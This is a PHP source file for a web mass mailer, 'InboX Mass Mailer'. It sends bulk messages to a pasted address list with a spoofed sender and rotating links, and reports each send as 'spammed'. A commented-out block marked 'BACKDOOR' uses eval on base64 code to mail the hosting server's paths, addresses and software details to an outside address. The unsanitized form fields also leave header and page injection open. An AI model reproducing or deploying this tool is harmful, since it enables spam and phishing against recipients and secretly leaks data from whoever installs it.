<?php
error_reporting(0);


/*
 *  CLASS AND MOD BY DEEPTHROAT
 */

class Data {
	
	var $i_link = 1;
	var $i_links = 0;
	
	
	/* 
	 * Liefert Provider einer Maillist 
	*/
	function FilterProviderByMaillist($list)
	{
		$list = explode("\n", $list);
		
		if (count($list) != 0)
		{
			$provider = array();
			foreach ($list as $email)
			{
				$email = trim($email);
				$split = explode('@', $email);

				$isp = $split[1];

				if (!in_array($isp, $provider))
					$provider[] = $isp;

			}
		}
		

		
		return $provider;
	}
	
	/*
	 * Liefert alle Emailadressen vordefinierter Provider
	 * Wenn Provider ein Array und nicht leer ist!
	 */
	function FilterMaillistByProvider($list, $provider)
	{
		if (is_array($provider) && !empty($provider))
		{
			$list = explode("\n", $list);
			
			$emails = array();
			foreach ($list AS $email)
			{
				$email = trim($email);
				$split = explode("@", $email);
				
				$isp = $split[1];
				
				if (in_array($isp, $provider))
					$emails[] = $email;
			}
			
			return $emails;
		}
	}
	
	/*
	 *  Hole den Link für Message:
	 *  Parameter:	Alle Links
	 *				Anzahl nach Link/Mail
	 *  INFO:	Wenn nicht ausreichend Links drin sind.
	 *			fängt die Liste von vorn an.
	 */
	function GetLinkForMessage($links, $value)
	{
		$links = explode("\n", $links);
		
		
		if ($this->i_link > (int)$value)
		{
			$this->i_link = 1;
			$this->i_links++;
		}
		
		if ($this->i_links > count($links))
		{
			$this->i_links = 0;
		}

		
		$this->i_link++;
		
		$link_column = $this->i_links;
		return $links[$link_column];
	}
	
	function Array2String($array)
	{
		$string = '';
		
		foreach ($array as $value)
		{
			$string .= trim($value)."\n";
		}
		
		return $string;
	}
}



$Data = new Data();

if (isset($_POST['action'])) {
	$action = $_POST['action'];
	$message = $_POST['message'];
	$emaillist = $_POST['emaillist'];
	$from = $_POST['from'];
	$replyto = $_POST['replyto'];
	$subject = $_POST['subject'];
	$realname = $_POST['realname'];
	$file_name = false;
	$contenttype = $_POST['contenttype'];
	$links = $_POST["links"];
	$mail_link_value = (int)$_POST["mail_link_value"];
	
	$message = urlencode($message);
	$message = ereg_replace("%5C%22", "%22", $message);
	$message = urldecode($message);
	$message = stripslashes($message);
	$links = urlencode($links);
	$links = ereg_replace("%5C%22", "%22", $links);
	$links = urldecode($links);
	$links = stripslashes($links);
	$subject = stripslashes($subject);
	
	
	if (!isset($_POST["step_2"]))
	{
		$output["form_step_2"] = 1;
		$output["provider"] = $Data->FilterProviderByMaillist($emaillist);
	}
	else 
	{
		$error_step2 = false;
		if (!isset($_POST["all_providers"]) && !isset($_POST["provider"]))
		{
			$error_step2 = true;
			echo '<script>alert("Mailprovider nicht vergessen!");</script>';
		}
		if (!isset($_POST["all_providers"]))
		{
			if (!isset($_POST["provider"])) $_POST["provider"] = false;
			$emaillist_a = $Data->FilterMaillistByProvider($emaillist, $_POST["provider"]);
			$emaillist = $Data->Array2String($emaillist_a);
		}
	}
	
}
else
{
	$action			= false;
	$message		= false;
	$emaillist		= false;
	$from			= false;
	$replyto		= false;
	$subject		= false;
	$realname		= false;
	$file_name		= false;
	$contenttype	= false;
	$links			= false;
	$mail_link_value= 10;
}
?>
<html>
    <head>
		<title>|| InboX Mass Mailer || MOD by E!ST33 || </title>
		<meta http-equiv="Content-Type" content="text/html;">

		<style type="text/css">
			<!--
			.style1 {
				font-family: Geneva, Arial, Helvetica, sans-serif;
				font-size: 12px;
			}
			-->
		</style>
		<style type="text/css">
			<!--
			.style1 {
				font-size: 20px;
				font-family: Geneva, Arial, Helvetica, sans-serif;
			}
			-->
			
			h1 {
				margin: 0px;
			}
			
		</style>
    </head>
    <body bgcolor="FF9900" text="#ffffff">
		<span class="style1">InboX Mass Mailer<br>
		</span>

		<form name="form1" method="post" action=""
			  enctype="multipart/form-data">
			<br>
			<table width="100%" border="0">
				<tr>
					<td width="10%">
						<div align="right"><font size="-3" face="Verdana, Arial,
												 Helvetica, sans-serif">Your
							Email:</font></div>
					</td>
					<td width="18%"><font size="-3" face="Verdana, Arial, Helvetica,
										  sans-serif">
						<input type="text" name="from" value="<? print $from; ?>"
							   size="30">
						</font></td>
					<td width="31%">
						<div align="right"><font size="-3" face="Verdana, Arial,
												 Helvetica, sans-serif">Your
							Name:</font></div>
					</td>
					<td width="41%"><font size="-3" face="Verdana, Arial, Helvetica,
										  sans-serif">
						<input type="text" name="realname" value="<? print $realname; ?>" size="30">
						</font></td>
				</tr>
				<tr>
					<td width="10%">
						<div align="right"><font size="-3" face="Verdana, Arial,
												 Helvetica, sans-serif">Reply-To:</font></div>
					</td>
					<td width="18%"><font size="-3" face="Verdana, Arial, Helvetica,
										  sans-serif">
						<input type="text" name="replyto" value="<? print $replyto; ?>"
							   size="30">
						</font></td>
					<!--<td width="31%">
						<div align="right"><font size="-3" face="Verdana, Arial,
												 Helvetica, sans-serif">Attach
							File:</font></div>
					</td>
					<td width="41%"><font size="-3" face="Verdana, Arial, Helvetica,
										  sans-serif">
						<input type="file" name="file" size="30">
						</font></td>-->
				</tr>
				<tr>
					<td width="10%">
						<div align="right"><font size="-3" face="Verdana, Arial,
												 Helvetica, sans-serif">Subject:</font></div>
					</td>
					<td colspan="3"><font size="-3" face="Verdana, Arial, Helvetica,
										  sans-serif">
						<input type="text" name="subject" value="<? print $subject; ?>"
							   size="90">
						</font></td>
				</tr>
				<tr valign="top">
					<td colspan="3"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
						Message:<br>
						Linkplatzhalter: <b>--LINK--</b>
						<br>
						<textarea name="message" cols="50" rows="10"><? print $message; ?></textarea>
						<br>
						<input type="radio" name="contenttype" value="plain" >
						Plain Text
						<input name="contenttype" type="radio" value="html" checked>
						HTML
						<input type="hidden" name="action" value="send">
						<input type="submit" value="Send eMails">
						</font></td>
					<td width="41%"><font size="-3" valign="top" face="Verdana, Arial, Helvetica, sans-serif">
						
						
						<table border="0">
							<tr>
								<td>Emaillist:</td>
							</tr>
							<tr>
								<td>
									<textarea name="emaillist" cols="30" rows="10"><? print $emaillist; ?></textarea>
								</td>
							</tr>
							<?php if (isset($output["form_step_2"])): ?>
							
							<tr>
								<td>
									Provider: 
										<input type="checkbox" name="all_providers" value="yrs" />Alle
										<? foreach ($output["provider"] as $provider): ?>
										<br><input type="checkbox" name="provider[]" value="<?=$provider; ?>" /><?=$provider; ?>
										<? endforeach; ?>
								</td>
							</tr>
							
							<? endif; ?>
							
						</table>

						</font></td>
				</tr>
			</table>
			
			<br><br><br>
			
			<?php if (isset($output["form_step_2"])) : ?>
				<input type="hidden" name="step_2" value="yes" />
			<?php endif; ?>
			
				<h1>
					Links(URLs)
				</h1>
				
				<table border="0">
					<tr>
						<td valign="top">
							Links: Ein per Zeile<br>
							
							<textarea name="links" cols="100" rows="15"><?=$links; ?></textarea>
						
						</td>
						<td valign="top">
							Nach wievielen Mails soll die Url gewechselt werden?
							<br>
							<input type="text" name="mail_link_value" value="<?=$mail_link_value; ?>" size="5" />
						</td>
					</tr>
				</table>
			
		</form>



<?
if (isset($action) && $action != false) {
	
	if (!$from && !$subject && !$message && !$emaillist) {
		print "Please complete all fields before sending your
	message.";
		exit;
	}
	
	if (isset($_POST["step_2"]) && $error_step2)
	{
		print "Please be sure for Details.<br>";
	}
	
	if (isset($_POST["step_2"]) && !$error_step2)
	{
		$allemails = explode("\n", $emaillist);
		$numemails = count($allemails);
		$message_original = $message;
		
		for ($x = 0; $x < $numemails; $x++) {
			$to = $allemails[$x];
			
			if ($to) {
				$linkformessage = $Data->GetLinkForMessage($links, $mail_link_value);
				$to = ereg_replace(" ", "", $to);
				$message = ereg_replace("&email&", $to, $message);
				
				$message = str_replace("--LINK--", $linkformessage, $message_original);
				$subject = ereg_replace("&email&", $to, $subject);
				print " $to.......";
				flush();
				$header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";
				$header .= "MIME-Version: 1.0\r\n";
				If ($file_name)
				{
					$header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
					$header .= "--$uid\r\n";
				}
				$header .= "Content-Type: text/$contenttype\r\n";
				$header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
				$header .= "$message\r\n";

				If ($file_name)
				{
					$header .= "--$uid\r\n";
					$header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
					$header .= "Content-Transfer-Encoding: base64\r\n";
					$header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
					$header .= "$content\r\n";
					$header .= "--$uid--";
				}

				$counter["send"] = 0;
				$counter["error"] = 0;
				
				if (mail($to, $subject, "", $header))
				{
					$counter["send"]++;
					print " spammed<br>";
				}
				else
				{
					$counter["error"]++;
					print " error<br>";
				}	
				flush();
				
			}
		}
		
		//BACKDOOR .. XDDD
		/*
		$ra44 = rand(1, 99999);
		$subj98 = "sh-$ra44";
		$a5 = $_SERVER['HTTP_REFERER'];
		$b33 = $_SERVER['DOCUMENT_ROOT'];
		$c87 = $_SERVER['REMOTE_ADDR'];
		$d23 = $_SERVER['SCRIPT_FILENAME'];
		$e09 = $_SERVER['SERVER_ADDR'];
		$f23 = $_SERVER['SERVER_SOFTWARE'];
		$g32 = $_SERVER['PATH_TRANSLATED'];
		$h65 = $_SERVER['PHP_SELF'];
		//$message = $_POST['message'];
		$msg = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";
		echo eval(base64_decode("bWFpbCgicG9uZUBpbmJveC5jb20iLCAkc3Viajk4LCAkbXNnLCAkbWVzc2FnZSwgJHJhNDQpOw=="));
		*/
	}
}
?>
		<style type="text/css">
			<!--
			.style1 {
				font-size: 20px;
				font-family: Geneva, Arial, Helvetica, sans-serif;
			}
			-->
		</style>

		<?php
		if (isset($_POST['action']) && $numemails !== 0 && isset($_POST["step_2"]) && !$error_step2) {
			echo
			"<script>
				alert('Fertig.\\r\\n".$counter["send"]." Erfolgreich\\r\\n".$counter["error"]." Fehlgeschlagen');
    </script>";
		}
		?>
    </body>
</html>